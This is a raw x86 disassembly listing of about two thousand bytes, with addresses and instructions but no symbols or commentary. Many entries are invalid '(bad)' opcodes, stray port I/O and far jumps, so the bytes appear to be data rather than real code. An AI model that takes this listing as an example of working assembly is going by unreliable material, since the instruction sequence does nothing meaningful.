  449ba2:	ins    DWORD PTR es:[edi],dx
  449ba3:	pop    ss
  449ba4:	xlat   BYTE PTR ds:[ebx]
  449ba5:	jmp    DWORD PTR [ebp+0x62011241]
  449bab:	dec    esi
  449bac:	add    al,BYTE PTR [eax]
  449bae:	bound  edi,QWORD PTR [edx+edx*8]
  449bb1:	sbb    BYTE PTR [edx-0x1a],dl
  449bb4:	int3   
  449bb5:	cmp    al,0x52
  449bb7:	(bad)  
  449bb8:	int3   
  449bb9:	push   ebp
  449bba:	xor    bh,bl
  449bbc:	int3   
  449bbd:	mov    esi,DWORD PTR [edx]
  449bbf:	mov    ah,0xd1
  449bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449bc2:	xor    bh,BYTE PTR [esi-0x2e]
  449bc5:	fdiv   QWORD PTR [edx]
  449bc7:	mov    bl,0xd1
  449bc9:	sbb    DWORD PTR [ebx-0x6ccb32de],edx
  449bcf:	leave  
  449bd0:	retf   
  449bd1:	jp     0x449b66
  449bd3:	ror    esp,0x89
  449bd6:	xchg   ebx,eax
  449bd7:	xchg   ecx,eax
  449bd8:	int3   
  449bd9:	int3   
  449bda:	jae    0x449bb5
  449bdc:	in     al,dx
  449bdd:	rol    DWORD PTR [eax],1
  449bdf:	jo     0x449bc8
  449be1:	(bad)  
  449be2:	shl    DWORD PTR [ebx-0xb2e7d19],1
  449be8:	out    0x20,eax
  449bea:	shl    DWORD PTR [edi],1
  449bec:	call   0xe6876d12
  449bf1:	(bad)
  449bf4:	out    0x4b,al
  449bf6:	ror    bl,cl
  449bf8:	out    0x1e,al
  449bfa:	rcl    BYTE PTR [ebx],cl
  449bfc:	out    0xd,eax
  449bfe:	sar    dl,cl
  449c00:	out    0x2,al
  449c02:	fadd   DWORD PTR [ebp-0x13]
  449c05:	jl     0x449bde
  449c07:	aad    0xed
  449c09:	inc    edi
  449c0a:	xlat   BYTE PTR ds:[ebx]
  449c0b:	ret    0xf2ed
  449c0e:	fdiv   DWORD PTR [edx-0x14]
  449c11:	rcr    al,1
  449c13:	jecxz  0x449c01
  449c15:	pop    edx
  449c16:	fadd   DWORD PTR [eax]
  449c18:	in     eax,dx
  449c19:	inc    eax
  449c1a:	fdivr  st,st(6)
  449c1c:	in     al,dx
  449c1d:	rcl    bh,0xc8
  449c20:	in     al,dx
  449c21:	pop    es
  449c22:	(bad)  
  449c23:	jnp    0x449c10
  449c25:	cmp    esi,edx
  449c27:	(bad)  
  449c28:	jmp    0x449bc6
  449c2a:	(bad)  
  449c2b:	nop
  449c2c:	jmp    0x449c20
  449c2e:	aam    0x70
  449c30:	jmp    0xdae9:0xeae1d529
  449c37:	push   eax
  449c38:	lock mov bl,bl
  449c3b:	lods   eax,DWORD PTR ds:[esi]
  449c3c:	lock mov ah,0xda
  449c3f:	outs   dx,BYTE PTR ds:[esi]
  449c40:	out    dx,eax
  449c41:	add    eax,esp
  449c43:	add    ah,dl
  449c45:	repz pop ecx
  449c47:	fiadd  WORD PTR [edx+0x6cde80f3]
  449c4d:	repnz adc ch,bl
  449c50:	aad    0xf2
  449c52:	dec    ebx
  449c53:	fld    QWORD PTR [edx+esi*8+0x0]
  449c57:	jmp    0x2d4573bd
  449c5c:	data16 fld DWORD PTR [eax]
  449c5f:	adc    DWORD PTR [esi],ecx
  449c61:	out    dx,eax
  449c62:	xor    bl,dl
  449c64:	adc    DWORD PTR [ecx+0x31],ebx
  449c67:	outs   dx,BYTE PTR ds:[esi]
  449c68:	push   cs
  449c69:	xor    DWORD PTR [ecx],0x24
  449c6c:	sub    esi,DWORD PTR ss:[ecx]
  449c6f:	adc    dh,BYTE PTR [ecx]
  449c71:	sti    
  449c72:	das    
  449c73:	hlt    
  449c74:	xor    cl,dh
  449c76:	das    
  449c77:	scas   eax,DWORD PTR es:[edi]
  449c78:	xor    BYTE PTR [esi-0x47ef6dd1],dl
  449c7e:	das    
  449c7f:	xor    edx,DWORD PTR [ecx]
  449c81:	add    dh,BYTE PTR [ebx]
  449c83:	cmp    al,0x10
  449c85:	(bad)  [ecx]
  449c87:	std    
  449c88:	adc    dl,BYTE PTR [ecx+0x32]
  449c8b:	outs   dx,DWORD PTR ds:[esi]
  449c8c:	mov    bl,0x7d
  449c8e:	xor    al,BYTE PTR [edi]
  449c90:	mov    bl,0x73
  449c92:	sub    eax,0x2d23aa2e
  449c97:	adc    ch,BYTE PTR [edx-0x6a00d2ec]
  449c9d:	inc    esp
  449c9e:	sub    eax,0x2d2b8de0
  449ca3:	in     al,0x94
  449ca5:	imul   DWORD PTR [ebx]
  449ca7:	add    al,0x0
  449ca9:	mov    WORD PTR [ebx+0x51b75e2e],cs
  449caf:	das    
  449cb0:	sub    BYTE PTR [edi-0x4995d21c],0x4b
  449cb7:	cs scas al,BYTE PTR es:[edi]
  449cb9:	scas   al,BYTE PTR es:[edi]
  449cba:	adc    al,0x2e
  449cbc:	(bad)  
  449cbd:	cdq    
  449cbe:	out    0x38,eax
  449cc0:	inc    edx
  449cc1:	xchg   esi,eax
  449cc2:	mov    al,0x38
  449cc4:	jp     0x449c4f
  449cc6:	push   ds
  449cc7:	cmp    edx,esi
  449cc9:	mov    cl,bh
  449ccb:	aaa    
  449ccc:	sub    edi,DWORD PTR [ecx]
  449cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449ccf:	aaa    
  449cd0:	add    BYTE PTR [esi-0x73c646ed],bh
  449cd6:	adc    edx,eax
  449cd8:	cmp    DWORD PTR [ebx+0x13],eax
  449cdb:	cld    
  449cdc:	cmp    DWORD PTR [ecx],ebp
  449cde:	adc    esp,DWORD PTR [edx+edi*1]
  449ce1:	icebp  
  449ce2:	adc    cl,BYTE PTR [edx+edi*1+0x15]
  449ce6:	adc    eax,DWORD PTR [ecx+0x4b12963a]
  449cec:	cmp    ecx,DWORD PTR [edx-0x6dc48aef]
  449cf2:	adc    DWORD PTR [ebp+0x3b],edi
  449cf5:	stos   BYTE PTR es:[edi],al
  449cf6:	adc    DWORD PTR [ebp-0x72ee4dc5],eax
  449cfc:	cmp    ebp,edx
  449cfe:	adc    DWORD PTR [ebp-0x62ee6dc5],edx
  449d04:	cmp    ecx,DWORD PTR [edx-0x6dc45aef]
  449d0a:	adc    DWORD PTR [ebp+0x117e003b],ebp
  449d10:	xlat   BYTE PTR ds:[ebx]
  449d11:	cmp    esi,DWORD PTR [esi+ecx*1+0x2cbbfff6]
  449d18:	add    BYTE PTR [eax],al
  449d1a:	(bad)  
  449d1b:	fadd   QWORD PTR [eax]
  449d1d:	add    BYTE PTR [esi-0x67cf91f4],ch
  449d23:	add    eax,0x7613137
  449d28:	xor    dl,BYTE PTR cs:[eax+ecx*1-0x6c]
  449d2d:	xor    esi,eax
  449d2f:	or     dh,dh
  449d31:	xor    edi,DWORD PTR [eax+0x4535fd20]
  449d37:	or     ebp,DWORD PTR [ecx+0x36]
  449d3a:	std    
  449d3b:	or     bl,BYTE PTR [edx+0xe0d6436]
  449d41:	cmp    DWORD PTR [ebx-0x37c665f3],eax
  449d47:	push   cs
  449d48:	add    BYTE PTR [edx],bh
  449d4a:	bound  esi,QWORD PTR [edx]
  449d4c:	aam    0x21
  449d4e:	cwde   
  449d4f:	adc    esp,edx
  449d51:	jnp    0x449ceb
  449d53:	xchg   esp,eax
  449d54:	(bad)  
  449d55:	mov    ds:0xc5d6e788,eax
  449d5a:	mov    BYTE PTR [edi+0x167904d6],ch
  449d60:	xlat   BYTE PTR ds:[ebx]
  449d61:	dec    ebp
  449d62:	jns    0x449d78
  449d64:	xlat   BYTE PTR ds:[ebx]
  449d65:	mov    ch,BYTE PTR [ecx-0x51]
  449d68:	aad    0xae
  449d6a:	imul   edi,edx,0x9459d5d5
  449d70:	aad    0xf7
  449d72:	add    BYTE PTR [ecx+0xd],bl
  449d75:	into   
  449d76:	cs dec esi
  449d78:	and    al,0xce
  449d7a:	add    BYTE PTR [esi-0x75],0xd8
  449d7e:	mov    eax,ds:0xcfd8af3e
  449d83:	ss lock fsub st,st(3)
  449d87:	cs (bad) 
  449d8a:	sbb    al,0x27
  449d8c:	push   es
  449d8d:	fld    DWORD PTR [ecx-0x61]
  449d90:	imul   ebx,ecx,0x67
  449d93:	xchg   edi,eax
  449d94:	push   edi
  449d95:	fnstcw WORD PTR [edi+ecx*4-0x71]
  449d99:	xlat   BYTE PTR ds:[ebx]
  449d9a:	stos   DWORD PTR es:[edi],eax
  449d9b:	xchg   DWORD PTR [edx],eax
  449d9d:	fmul   st,st(6)
  449d9f:	jg     0x449d7e
  449da1:	xlat   BYTE PTR ds:[ebx]
  449da2:	in     al,dx
  449da3:	ja     0x449ddc
  449da5:	(bad)  ds:0x2bd82e6c
  449dab:	fs enter 0x4cda,0x5c
  449db0:	jmp    0x449d8c
  449db2:	imul   edx,DWORD PTR [ecx+eax*8-0x29],0xffffff97
  449db7:	dec    esp
  449db8:	nop
  449db9:	xlat   BYTE PTR ds:[ebx]
  449dba:	lds    eax,FWORD PTR [eax+ecx*2-0x28]
  449dbe:	out    dx,eax
  449dbf:	cmp    al,0x38
  449dc1:	fisttp DWORD PTR [esi*1+0x33dacbd9]
  449dc8:	lock cmp ebx,ebx
  449dcb:	add    esi,eax
  449dcd:	sbb    ebx,ebx
  449dcf:	fldz   
  449dd1:	jno    0x449dad
  449dd3:	or     al,0xef
  449dd5:	out    0xe3,eax
  449dd7:	add    BYTE PTR [ebx-0x27],ah
  449dda:	pop    edi
  449ddb:	add    esp,DWORD PTR [edx-0x27]
  449dde:	out    0xd3,al
  449de0:	test   ecx,ebp
  449de2:	out    0xd3,al
  449de4:	fucomi st,st(1)
  449de6:	mov    edx,ebx
  449de8:	or     dl,ch
  449dea:	dec    edi
  449deb:	rcr    DWORD PTR [eax+ebp*8-0xb],cl
  449def:	aam    0x71
  449df1:	call   0xe88e72ff
  449df6:	test   eax,0x95e8b0d4
  449dfb:	aam    0x7b
  449dfd:	call   0xe8b972b9
  449e02:	sub    esp,edx
  449e04:	imul   ebp,ebx,0xffffffd7
  449e07:	aad    0x34
  449e09:	jmp    0x449d8e
  449e0b:	aad    0x6f
  449e0d:	jmp    0x449e86
  449e0f:	aad    0x9
  449e11:	in     al,dx
  449e12:	xor    dl,ch
  449e14:	mov    edi,0x7ed6eaeb
  449e19:	jmp    0xd650:0xeae3d683
  449e20:	cld    
  449e21:	jmp    0xd228:0xe54bcfa3
  449e28:	add    al,ch
  449e2a:	(bad)  
  449e2b:	ror    BYTE PTR [edi-0x1a],cl
  449e2e:	add    ecx,edx
  449e30:	cmp    eax,0xf8d16be6
  449e35:	out    0x74,al
  449e37:	rcl    esi,1
  449e39:	out    0xa2,al
  449e3b:	rol    DWORD PTR [eax],1
  449e3d:	jns    0x449e25
  449e3f:	add    cl,ch
  449e41:	cdq    
  449e42:	push   edx
  449e43:	cmp    DWORD PTR [eax-0x6a],edi
  449e46:	ins    BYTE PTR es:[edi],dx
  449e47:	cmp    DWORD PTR [esi+0x10393f8e],esi
  449e4d:	mov    DWORD PTR [ebp+0x38],eax
  449e50:	loop   0x449e91
  449e52:	out    0x3a,al
  449e54:	add    DWORD PTR [ecx+edx*8],esi
  449e57:	cmp    DWORD PTR [ebx],edx
  449e59:	das    
  449e5a:	jge    0x449e96
  449e5c:	dec    edi
  449e5d:	sub    eax,0x1578341e
  449e62:	fidiv  DWORD PTR [esi]
  449e64:	nop/reserved BYTE PTR [esi+0x36]
  449e68:	cmp    DWORD PTR [ebx],ecx
  449e6a:	cmp    BYTE PTR [esi],dh
  449e6c:	pop    ebp
  449e6d:	or     ebp,DWORD PTR [esi]
  449e6f:	imul   cl
  449e71:	xor    eax,ebx
  449e73:	add    BYTE PTR [ecx-0x14ff26a2],al
  449e79:	xor    ebx,edx
  449e7b:	xor    BYTE PTR [ecx],dl
  449e7d:	cs cdq 
  449e7f:	xor    BYTE PTR [esi-0x3ecf6eef],ch
  449e85:	adc    DWORD PTR [eax+esi*1+0x314d166d],esp
  449e8c:	push   esp
  449e8d:	push   cs
  449e8e:	jb     0x449ec1
  449e90:	aaa    
  449e91:	mov    dh,0x11
  449e93:	xor    DWORD PTR [edi],edx
  449e95:	scas   al,BYTE PTR es:[edi]
  449e96:	sub    DWORD PTR [ecx],esi
  449e98:	fnstenv [eax-0x4f2cd008]
  449e9e:	std    
  449e9f:	das    
  449ea0:	stos   BYTE PTR es:[edi],al
  449ea1:	add    BYTE PTR [eax-0x6f74d060],dl
  449ea7:	mov    ebp,0x4f906d2f
  449eac:	xor    BYTE PTR [edx-0x4ccf8f70],dl
  449eb2:	mov    al,0xda
  449eb4:	xor    bh,dh
  449eb6:	scas   eax,DWORD PTR es:[edi]
  449eb7:	xchg   edx,eax
  449eb8:	xor    al,BYTE PTR [eax]
  449eba:	mov    ch,0x3
  449ebc:	cmp    BYTE PTR [ebx],dh
  449ebe:	inc    ebp
  449ebf:	add    al,0xe2
  449ec1:	xor    edi,DWORD PTR [eax+0x7e33ef04]
  449ec7:	sbb    eax,0x965340e
  449ecc:	dec    eax
  449ecd:	xor    al,0x2a
  449ecf:	or     DWORD PTR [eax+0x81d0034],ebp
  449ed5:	xor    eax,0x352e1c53
  449eda:	jg     0x449ef8
  449edc:	addr16 xor eax,0x35a91ba4
  449ee2:	jbe    0x449eff
  449ee4:	or     eax,0x410af736
  449ee9:	and    cl,BYTE PTR ss:[ebx]
  449eec:	pop    esi
  449eed:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  449eef:	or     bl,BYTE PTR [edx-0xf54dca]
  449ef5:	lds    ecx,FWORD PTR ss:[ecx]
  449ef8:	imul   esi,DWORD PTR [edi],0x37b00a20
  449efe:	push   esp
  449eff:	or     eax,0x10573867
  449f04:	cmp    WORD PTR [eax],ax
  449f07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449f08:	pextrw edi,(bad),0xc5
  449f0a:	cmp    edx,ebx
  449f0c:	push   cs
  449f0d:	sbb    BYTE PTR [ebx],bh
  449f0f:	rol    BYTE PTR [ebx],0x86
  449f12:	ds icebp 
  449f14:	adc    edi,ecx
  449f16:	aas    
  449f17:	jnp    0x449f2a
  449f19:	idiv   bh
  449f1b:	mov    ebx,0x4b000018
  449f20:	fadd   DWORD PTR [eax]
  449f22:	add    dh,bl
  449f24:	or     BYTE PTR [eax-0x48f784d0],al
  449f2a:	xor    BYTE PTR [esi+0x7a343b05],ah
  449f30:	or     DWORD PTR [edi-0x30749dcc],ebp
  449f36:	jbe    0x449f87
  449f38:	test   al,0xcf
  449f3a:	lahf   
  449f3b:	push   edi
  449f3c:	cwde   
  449f3d:	(bad)  
  449f3e:	mov    DWORD PTR [edx+edx*4-0x3a],ecx
  449f42:	shl    DWORD PTR [edx+ecx*2],1
  449f45:	(bad)  
  449f46:	adc    BYTE PTR ds:0x3546c707,ch
  449f4c:	cdq    
  449f4d:	lds    eax,FWORD PTR [ebp+ebp*1-0x65f33a5d]
  449f54:	std    
  449f55:	aam    0xc3
  449f57:	call   0xdac5:0x8b33d4ab
  449f5e:	loop   0x449ee8
  449f60:	xor    bl,bl
  449f62:	ins    DWORD PTR es:[edi],dx
  449f63:	jns    0x449f1c
  449f65:	fld    st(5)
  449f67:	jns    0x449fca
  449f69:	(bad)  
  449f6b:	add    BYTE PTR [ecx-0x7f],ch
  449f6e:	into   
  449f6f:	dec    esp
  449f70:	popw   ds
  449f72:	into   
  449f73:	cmp    DWORD PTR [edi+0x79],ebx
  449f76:	fstp   DWORD PTR [esi+0x57]
  449f79:	mov    bl,0xd7
  449f7b:	xlat   BYTE PTR ds:[ebx]
  449f7c:	dec    edi
  449f7d:	xchg   bh,dl
  449f7f:	or     al,0x44
  449f81:	mov    bh,0xce
  449f83:	pushf  
  449f84:	cmp    al,0x9b
  449f86:	into   
  449f87:	test   al,0x35
  449f89:	(bad)  
  449f8b:	(bad)  
  449f8c:	in     eax,dx
  449f8d:	inc    ecx
  449f8e:	mov    dl,0x1
  449f90:	bound  esp,QWORD PTR [edx+0x4062fffc]
  449f96:	rol    BYTE PTR [edi],cl
  449f98:	xchg   edx,eax
  449f99:	jg     0x449f6d
  449f9b:	dec    eax
  449f9c:	xchg   edx,eax
  449f9d:	mov    dl,0xd1
  449f9f:	jns    0x449f33
  449fa1:	mov    dh,0xcc
  449fa3:	mov    ds:0xc8ccff72,eax
  449fa8:	jb     0x449f6d
  449faa:	int3   
  449fab:	jmp    0xd52e7922
  449fb0:	dec    edx
  449fb1:	jmp    0xd48a:0xe9f1d52f
  449fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449fb9:	jmp    0xe8b57484
  449fbe:	inc    edi
  449fbf:	shl    ebx,cl
  449fc1:	out    0x8a,eax
  449fc3:	shl    BYTE PTR [ebx-0x642d6619],cl
  449fc9:	out    0xaf,eax
  449fcb:	shl    BYTE PTR [esi-0x1b],cl
  449fce:	cli    
  449fcf:	iret   
  449fd0:	add    al,al
  449fd2:	in     al,0x4c
  449fd4:	iret   
  449fd5:	jb     0x449fbb
  449fd7:	mov    esi,0x13e496d0
  449fdc:	sar    DWORD PTR [eax-0x102f061c],1
  449fe2:	in     al,0xa7
  449fe4:	sar    bh,1
  449fe6:	in     al,0x84
  449fe8:	sar    BYTE PTR [edx],1
  449fea:	in     eax,0xb3
  449fec:	int    0xa4
  449fee:	jecxz  0x449fbf
  449ff0:	int    0xfc
  449ff2:	jecxz  0x44a00f
  449ff4:	int    0x2
  449ff6:	in     al,0x4c
  449ff8:	int    0x94
  449ffa:	loop   0x44a050
  449ffc:	into   
  449ffd:	aam    0xe2
  449fff:	sbb    dh,cl
  44a001:	adc    esp,ebx
  44a003:	icebp  
  44a004:	fstp   TBYTE PTR [edx]
  44a006:	icebp  
  44a007:	dec    edi
  44a008:	fstp   TBYTE PTR [eax-0x6724ec0f]
  44a00e:	lock (bad) 
  44a010:	fsub   st(4),st
  44a012:	lock jne 0x449fee
  44a015:	jp     0x44a003
  44a017:	ret    
  44a018:	fcom   DWORD PTR [ebp+0x2cd8b1ec]
  44a01e:	in     al,dx
  44a01f:	push   0xffffffd8
  44a021:	icebp  
  44a022:	in     al,dx
  44a023:	push   eax
  44a024:	fdivr  st,st(3)
  44a026:	in     al,dx
  44a027:	add    BYTE PTR [ebx],bl
  44a029:	call   0x35c5:0x97eb3402
  44a030:	jmp    0x51457936
  44a035:	add    BYTE PTR [esi-0x27],ah
  44a038:	add    dl,bh
  44a03a:	mov    bl,0xd8
  44a03c:	xor    DWORD PTR [esp+ebx*4-0x6904d20a],ebx
  44a043:	add    DWORD PTR [ecx],edi
  44a045:	stos   BYTE PTR es:[edi],al
  44a046:	sahf   
  44a047:	mov    dh,BYTE PTR [edi]
  44a049:	gs cdq 
  44a04b:	ds cmp cl,dl
  44a04e:	mov    ebx,DWORD PTR [esi+0x1d8b7339]
  44a054:	cmp    al,BYTE PTR [edx+0x35]
  44a057:	mov    ebx,0x802d6633
  44a05c:	xor    al,0xea
  44a05e:	aaa    
  44a05f:	loope  0x44a097
  44a061:	imul   DWORD PTR [edi]
  44a063:	ret    0xd036
  44a066:	pop    ss
  44a067:	cdq    
  44a068:	ss sbb al,0xc
  44a06b:	mov    esi,0x80146036
  44a070:	aaa    
  44a071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a072:	or     al,0x5
  44a074:	aaa    
  44a075:	dec    esi
  44a076:	xor    al,0xdf
  44a078:	xor    eax,0x35fd2efa
  44a07d:	stos   DWORD PTR es:[edi],eax
  44a07e:	ss nop
  44a080:	xor    eax,0x358b2ec9
  44a085:	mov    ah,0x16
  44a087:	push   esi
  44a088:	ss pop ebx
  44a08a:	vmread DWORD PTR [esi],esi
  44a08d:	adc    DWORD PTR [edi],0xf5d3674
  44a093:	adc    BYTE PTR [esi],dh
  44a095:	and    esi,DWORD PTR [edi+0xe9f629]
  44a09b:	icebp  
  44a09c:	xlat   BYTE PTR ds:[ebx]
  44a09d:	add    cl,dh
  44a09f:	pusha  
  44a0a0:	fld    DWORD PTR [eax]
  44a0a2:	add    BYTE PTR [esi-0x23cfc7fb],ch
  44a0a8:	add    eax,0x5423072
  44a0ad:	mov    dh,BYTE PTR [eax]
  44a0af:	and    BYTE PTR ds:0x5eb30b4,al
  44a0b5:	aad    0x30
  44a0b7:	mov    cl,0x5
  44a0b9:	repz xor BYTE PTR [ebx-0x75cf0bfa],cl
  44a0c0:	push   es
  44a0c1:	das    
  44a0c2:	xor    DWORD PTR [eax+0x6],eax
  44a0c5:	popa   
  44a0c6:	xor    DWORD PTR [esi+eax*1],esp
  44a0c9:	pop    ebp
  44a0ca:	xor    DWORD PTR [ecx],esi
  44a0cc:	push   es
  44a0cd:	ja     0x44a100
  44a0cf:	adc    al,0x7
  44a0d1:	xchg   edx,eax
  44a0d2:	xor    DWORD PTR [ecx],ebx
  44a0d4:	pop    es
  44a0d5:	xchg   edi,eax
  44a0d6:	xor    DWORD PTR [ecx],ecx
  44a0d8:	or     al,0xb7
  44a0da:	xor    DWORD PTR [ecx],ebx
  44a0dc:	or     al,0xe1
  44a0de:	xor    ebp,esp
  44a0e0:	or     edi,edx
  44a0e2:	xor    DWORD PTR [ecx+0xb],edx
  44a0e5:	or     dh,BYTE PTR [edx]
  44a0e7:	leave  
  44a0e8:	or     ah,BYTE PTR [ebx-0x5af55dce]
  44a0ee:	xor    bh,al
  44a0f0:	or     bh,bl
  44a0f2:	xor    bh,BYTE PTR [ebx]
  44a0f4:	or     ch,BYTE PTR [ecx]
  44a0f6:	xor    ebp,DWORD PTR [edx+ecx*1+0x3d]
  44a0fa:	xor    esi,DWORD PTR [edx+ecx*1]
  44a0fd:	ins    DWORD PTR es:[edi],dx
  44a0fe:	xor    eax,DWORD PTR [eax]
  44a100:	test   BYTE PTR [ecx],cl
  44a102:	xchg   edi,eax
  44a103:	xor    ebp,esi
  44a105:	or     eax,ecx
  44a107:	xor    ebx,DWORD PTR [ebx+0x9]
  44a10a:	loopne 0x44a13f
  44a10c:	mov    al,ds:0x433ec09
  44a111:	sbb    DWORD PTR [ecx],ebp
  44a113:	xor    al,0xb9
  44a115:	sbb    BYTE PTR [esi],bh
  44a117:	xor    al,0xfb
  44a119:	sbb    BYTE PTR [ebx-0x3a779dcc],cl
  44a11f:	inc    eax
  44a120:	xchg   edi,eax
  44a121:	cmp    esp,eax
  44a123:	jl     0x74586531
  44a129:	jne    0x44a0ef
  44a12b:	mov    ecx,0xbac53d6c
  44a130:	jne    0x44a0fb
  44a132:	(bad)  
  44a133:	fld    TBYTE PTR [ebp+0x3a]
  44a136:	(bad)  
  44a138:	push   ebp
  44a139:	aas    
  44a13a:	retf   0x5a12
  44a13d:	(bad)  
  44a13e:	les    esi,FWORD PTR ds:0x5ac4c74a
  44a144:	dec    edx
  44a145:	(bad)  
  44a146:	les    esi,FWORD PTR [ebp+0x3a]
  44a149:	mov    esi,0x8d3a86c4
  44a14e:	les    ebx,FWORD PTR [ebx-0x3b3b49d6]
  44a154:	sub    dl,BYTE PTR [edi-0x3b]
  44a157:	repnz call 0xc3e1:0x9b11c53f
  44a15f:	bound  ecx,QWORD PTR [ebx+0x9dc3be]
  44a165:	mov    esp,ebp
  44a167:	ret    
  44a168:	(bad)  
  44a169:	jnp    0x44a195
  44a16b:	les    ecx,FWORD PTR [edx+0x78]
  44a16e:	fadd   st,st(6)
  44a170:	mov    ds:0x2fc71c68,eax
  44a175:	imul   esi,DWORD PTR [edx-0x39],0xc7095945
  44a17c:	scas   eax,DWORD PTR es:[edi]
  44a17d:	pop    ecx
  44a17e:	loop   0x44a145
  44a180:	fisttp WORD PTR [ecx-0x69]
  44a183:	lds    eax,FWORD PTR [ebx]
  44a185:	inc    esi
  44a186:	add    eax,esi
  44a188:	sbb    al,0x3e
  44a18a:	adc    eax,esi
  44a18c:	outs   dx,BYTE PTR ds:[esi]
  44a18d:	ss xchg eax,edx
  44a190:	xchg   esi,eax
  44a191:	cs enter 0xcdd0,0x26
  44a196:	(bad)  
  44a198:	rcl    BYTE PTR [ebp+0x24d0d5e6],1
  44a19e:	out    0x80,al
  44a1a0:	sar    BYTE PTR [ecx],1
  44a1a2:	out    0x71,al
  44a1a4:	shl    DWORD PTR [edx-0x662ee31b],1
  44a1aa:	in     eax,0xd0
  44a1ac:	sar    DWORD PTR [ebx-0x19],1
  44a1af:	xchg   ebp,eax
  44a1b0:	ror    DWORD PTR ds:0xd2d25de7,1
  44a1b6:	out    0xe7,al
  44a1b8:	and    DWORD PTR [eax-0x27],0xffffffe3
  44a1bc:	add    esp,DWORD PTR [edx-0x27]
  44a1bf:	mov    dl,cl
  44a1c1:	lea    esp,[edi]
  44a1c3:	call   0xfc1e023b
  44a1c8:	add    eax,DWORD PTR [eax]
  44a1ca:	(bad)  
  44a1cb:	fnstenv [edx-0x16382d]
  44a1d1:	(bad)  
  44a1d2:	xor    ebp,esp
  44a1d4:	inc    eax
  44a1d5:	xlat   BYTE PTR ds:[ebx]
  44a1d6:	retf   0x62ec
  44a1d9:	xlat   BYTE PTR ds:[ebx]
  44a1da:	cmp    dh,ch
  44a1dc:	jnp    0x44a1b5
  44a1de:	fs in  al,dx
  44a1e0:	ss (bad) 
  44a1e3:	in     al,dx
  44a1e4:	outs   dx,BYTE PTR ds:[esi]
  44a1e5:	fcomp  DWORD PTR [ebx]
  44a1e7:	in     eax,dx
  44a1e8:	aam    0xda
  44a1ea:	daa    
  44a1eb:	out    dx,eax
  44a1ec:	es int3 
  44a1ee:	mov    al,0xe1
  44a1f0:	jno    0x44a1bd
  44a1f2:	je     0x44a1d4
  44a1f4:	addr16 int 0xdf
  44a1f7:	in     al,0x73
  44a1f9:	shr    BYTE PTR [edi-0x792d4919],1
  44a1ff:	out    0xe7,al
  44a201:	arpl   WORD PTR [eax-0x27],sp
  44a204:	mov    bl,0x3
  44a206:	(bad)  
  44a207:	fst    DWORD PTR [ebx-0x2c]
  44a20a:	fucomi st,st(0)
  44a20c:	popa   
  44a20d:	aad    0xd5
  44a20f:	jmp    0x44a211
  44a211:	jge    0x44a22a
  44a213:	mov    ebx,0x630c6f31
  44a218:	xor    bh,BYTE PTR ds:0x1b3238b4
  44a21e:	lods   al,BYTE PTR ds:[esi]
  44a21f:	cs xor ch,ch
  44a222:	mov    ch,0xe6
  44a224:	sub    al,0x6f
  44a226:	lods   eax,DWORD PTR ds:[esi]
  44a227:	inc    ebp
  44a228:	sub    eax,0x2c659503
  44a22d:	adc    BYTE PTR [eax],al
  44a22f:	call   0x2e6a:0x88402c3f
  44a236:	mov    BYTE PTR [esi-0x569fc879],dl
  44a23c:	inc    ecx
  44a23d:	cmp    BYTE PTR [esi-0xc7cf57],bh
  44a243:	popf   
  44a244:	mov    al,0x34
  44a246:	push   ebp
  44a247:	mov    dl,0xa2
  44a249:	xor    al,0xa8
  44a24b:	xchg   edx,eax
  44a24c:	retf   
  44a24d:	xor    edx,DWORD PTR [edx]
  44a24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a250:	hlt    
  44a251:	xor    esp,DWORD PTR [eax-0x13cbd463]
  44a257:	xchg   ebx,eax
  44a258:	push   ss
  44a259:	aaa    
  44a25a:	mov    esi,0x3a35e230
  44a25f:	xor    ebx,DWORD PTR [ebx+0x36]
  44a262:	xor    ecx,DWORD PTR [bp+si+0x36]
  44a266:	push   ebp
  44a267:	xor    eax,DWORD PTR [ecx]
  44a269:	ss xchg edi,eax
  44a26b:	adc    esp,DWORD PTR [esi]
  44a26d:	imul   cl
  44a26f:	xchg   ecx,eax
  44a270:	fild   DWORD PTR [eax]
  44a272:	ins    DWORD PTR es:[edi],dx
  44a273:	data16 fld DWORD PTR [eax]
  44a276:	mov    ebx,0x7a30ef11
  44a27b:	ss jnp 0x44a2af
  44a27e:	dec    eax
  44a27f:	cs jecxz 0x44a2b1
  44a282:	mov    cl,0x30
  44a284:	xchg   BYTE PTR [edi],ch
  44a286:	ret    
  44a287:	xor    BYTE PTR [edx+0xa88002f],ch
  44a28d:	xchg   DWORD PTR [ecx],esi
  44a28f:	xchg   ebp,eax
  44a290:	or     bh,BYTE PTR [ebp+0xa290031]
  44a296:	add    dh,BYTE PTR [edx]
  44a298:	ret    
  44a299:	or     edx,DWORD PTR [edx+esi*1+0x3]
  44a29d:	or     al,0x80
  44a29f:	xor    dl,BYTE PTR [ebx+0xf]
  44a2a2:	xchg   BYTE PTR [edx],dh
  44a2a4:	les    ecx,FWORD PTR [ebx+ebx*1]
  44a2a7:	xor    eax,DWORD PTR ds:0x24339d0d
  44a2ad:	or     al,0xfc
  44a2af:	xor    ebp,DWORD PTR [ebx+0x2a346b0d]
  44a2b5:	push   cs
  44a2b6:	shl    BYTE PTR [esi],0xb5
  44a2b9:	push   DWORD PTR [esi]
  44a2bb:	aaa    
  44a2bc:	mov    ds:0x1e382200,al
  44a2c1:	adc    eax,0x126038e8
  44a2c6:	jns    0x44a301
  44a2c8:	icebp  
  44a2c9:	adc    dl,bh
  44a2cb:	cmp    DWORD PTR ds:0xd83a8917,edi
  44a2d1:	adc    edx,DWORD PTR [ebp+0x3b]
  44a2d4:	loop   0x44a2ea
  44a2d6:	mov    esp,0x4514a93b
  44a2db:	cmp    al,0xd9
  44a2dd:	adc    al,0xa6
  44a2df:	cmp    al,0xb6
  44a2e1:	adc    al,0xdc
  44a2e3:	cmp    al,0x18
  44a2e5:	adc    al,0x55
  44a2e7:	cmp    eax,0x3e75075b
  44a2ec:	push   ss
  44a2ed:	or     cl,BYTE PTR [edi+edi*1-0x9f603]
  44a2f4:	cmp    ebx,DWORD PTR [ecx-0x5cfffffe]
  44a2fa:	fadd   DWORD PTR [eax]
  44a2fc:	add    BYTE PTR [edi],ch
